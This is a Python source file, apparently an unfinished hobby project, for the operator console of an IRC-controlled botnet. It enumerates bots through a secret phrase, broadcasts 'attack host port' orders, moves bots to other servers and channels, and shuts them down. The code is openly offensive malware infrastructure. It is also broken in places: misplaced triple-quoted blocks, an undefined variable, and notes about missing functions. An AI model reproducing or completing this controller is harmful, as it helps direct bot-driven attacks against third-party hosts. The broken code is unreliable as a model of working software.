#!/usr/bin/python3

import sys
import socket
import random
import string
import time
from datetime import datetime, timedelta
import threading
import select

class PyBotCon:
# NOTES --> Have to thread a listener into this program to listen for responses in a while(True) loop
# NOTES --> Data collected from the listener thread has to be responded to appropriately
#             Bot responses to the secret need to populate a botList when appropriate
#             Bots need to respond to commands appropriately, and the thread needs to check flags to listen for these responses
# NOTES --> Commands from the user behind the conbot need to be able to input commands while the listener is collecting data
# Need to wait for 5 seconds then parse input from s.recv as long as s has data in it
# In the 5 seconds of wait time the socket will cache the data it receives
# After wait time (or before) the program will prompt for user input
  #PyBot object constructor 
  def __init__(self,host,port,channel,secret):

    #Create PyBotCon instanace variables
    self.host = host
    self.port = port
    self.channel = channel
    self.secret = secret
    self.nick = self.generateRandomName()

    try: # NOTE: Should put this in some kind of loop so the bot can retry, generateRandomName() should be called from inside of the loop
      self.ircsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      self.ircsock.connect((host,int(port)))
#      self.ircsock.setblocking(0)
      self.ircsock.send(bytes("USER " +self.nick+" "+self.nick+" "+self.nick+ " " + self.nick+ "\n","UTF-8"))
      self.ircsock.send(bytes("NICK " + self.nick + "\n", "UTF-8"))
    except:
      print("unable to connect to irc server")

#    self.ircsock.send(bytes("JOIN " + channel + "\n", "UTF-8")) #Join channel
    self.joinChan()
    self.identifyBots() 
    self.conMain()
#    self.listen()

  def generateRandomName(self):
    randomName = "".join(random.choice(string.ascii_uppercase + string.digits) for i in range(8))
    return randomName

  def joinChan(self):
    self.ircsock.send(bytes("JOIN "+self.channel+"\n", "UTF-8"))

  def conMain(self):
    while(True):
'''
      data = ""
      data = self.ircsock.recv(1024).decode("UTF-8")
      data = data.strip("\n\r")
      dataLen = len(data.split()) #Split on white space

      if dataLen == 2 and data.split()[0] == "PING":
        print("DEBUG --> data recieved: PING REQUEST")
        self.ping()
      elif dataLen >= 4 and data.split()[1] == "PRIVMSG": 
        print("DEBUG --> PRIVMSG/data recieved: ")
        senderDetails = data.split()[0].split(":")[1]
        senderNick = senderDetails.split("!")[0]
        channelOrUser = data.split()[2]   # THIS VARIABLE TELLS IF MESSAGE WAS sent publicly (#Channel), or private message (Our Nick)
        temp = data.split("PRIVMSG")[1].split(":")
        senderMessage = temp[1]
'''
      print("command> ",end='')
      command = input()
      if(command == "status"):
        self.identifyBots()
        print(str(len(self.botList))+" bots found: " + str(self.botList))
      elif(command.startswith("attack")):
        atkCommand = command.split()
        self.attackOrder(atkCommand[1],atkCommand[2])
        # NOTE --> Need to create a function for sending the attack command
        print("Call attack function here")
      elif(command.startswith("move")):
        chanCommand = command.split()
        self.changeChannel(self.channel, chanCommand[1], chanCommand[2], chanCommand[3])
        # Need to call a move channel function for the conbot, will write later
      elif(command=="quit"):
        # NOTE --> Might need to actually disconnect form the IRC server before exiting the program, will have to look into this
        sys.exit("Command Bot Disconnected")
      elif(command=="shutdown"):
        self.shutdownCommand()

  def attackOrder(self, hostname, port):
    self.ircsock.send(bytes("PRIVMSG " + self.channel + " :attack " + hostname + " " + port + "\n\r","UTF-8"))
    time.sleep(2)
    period = timedelta(seconds=5) 
    endLoop = datetime.now() + period
'''
    while datetime.now() < endLoop:
      read, _, _ = select.select([self.ircsock],[],[],5)
      if self.ircsock in read:
        data = self.ircsock.recv(2048).decode("UTF-8")
        data = data.strip("\n\r")
        dataLen = len(data.split())
        if(data.split()[1]=="PRIVMSG" and data.split("PRIVMSG",1)[1].split(":",1)[1].startswith("SUCCESS")): # NOTE --> The response message that we're expecting from bots is "YOURS"
          temp = data.split("PRIVMSG",1)[1].split(":",1)[1] # Finds name of the bot reply
          print("DEBUG --> Bot name found:" + temp)
          self.botList.append(temp[11:]) # Adds the name of the bot reply to botList
        elif dataLen == 2 and data.split()[0] == "PING":
          print("DEBUG --> data recieved: PING REQUEST")
          self.ping()
'''
  def ping(self):
    self.ircsock.send(bytes("PONG :pingis\n","UTF-8"))

  def shutdownCommand(self):
    self.ircsock.send(bytes("PRIVMSG " + self.channel + " :shutdown\n\r","UTF-8"))

  def changeChannel(self,channel,newServer, newPort, newChannel):
    self.ircsock.send(bytes("PRIVMSG " + channel + " :" + "move " + newServer + " " + newPort + " " + newChannel + "\n","UTF-8"))
    print(str(len(self.botList)) + " bots have moved to: " + newserver + "/" + newPort + " #" + newChannel + "\n")

  def identifyBots(self):
    # Send 'secret' message for bots to identify themselves
    self.ircsock.send(bytes("PRIVMSG " + self.channel + " :" + self.secret + "\n","UTF-8")) 
    self.botList = [] # botList starts as an empty list: it is cleared and rebuilt every time this function is called
    time.sleep(2)
    period = timedelta(seconds=5) 
    endLoop = datetime.now() + period
#    print("DEBUG --> readable socket list: " + str(read))
    while datetime.now() < endLoop:
      read, _, _ = select.select([self.ircsock],[],[],5)
      if self.ircsock in read:
        data = self.ircsock.recv(2048).decode("UTF-8")
        data = data.strip("\n\r")
        dataLen = len(data.split())
        if(data.split()[1]=="PRIVMSG" and data.split("PRIVMSG",1)[1].split(":",1)[1].startswith("BotName$$: ")):
          temp = data.split("PRIVMSG",1)[1].split(":",1)[1] # Finds name of the bot reply
#          print("DEBUG --> Bot name found:" + temp[11:])
          self.botList.append(temp[11:]) # Adds the name of the bot reply to botList
        elif dataLen == 2 and data.split()[0] == "PING":
#          print("DEBUG --> data recieved: PING REQUEST")
          self.ping()
    return


        

#Main
if __name__ == '__main__':

  if(len(sys.argv) == 5):
    host = sys.argv[1]
    port = sys.argv[2]
    channel = "#"+sys.argv[3]
    secret = sys.argv[4]
  else:
    print("Incorrect number of arguments")
    sys.exit("Usage: conbot.py <hostname> <port> <channel> <secret-phrase>")


  conBot = PyBotCon(host,port,channel,secret) #Create an instance of the bot 
  












